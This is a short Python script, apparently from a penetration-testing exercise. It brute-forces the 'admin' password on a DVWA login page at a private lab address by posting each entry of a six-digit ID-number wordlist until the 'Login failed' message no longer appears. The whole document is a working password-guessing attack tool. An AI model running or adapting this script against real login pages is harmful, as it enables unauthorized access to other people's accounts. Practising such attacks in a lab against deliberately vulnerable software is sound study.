#!/usr/bin/env python

import requests

# import the target url and method
target_url = "http://10.0.2.5/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}


# open the wordlist file and iterate through each word, stripping the words of whitespace chars
# once the password is found, it will be displayed and the program will terminate
with open("//home/Mitch/Documents/Password_Cracking/Wordlists/id_numbers_6dig", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        if "Login failed" not in response.content:
            print("[+] Found the password --> " + word)
            exit()

# If the program gets this far, it has not found the password in the wordlist
print("[+] Reached end of line. Try another wordlist")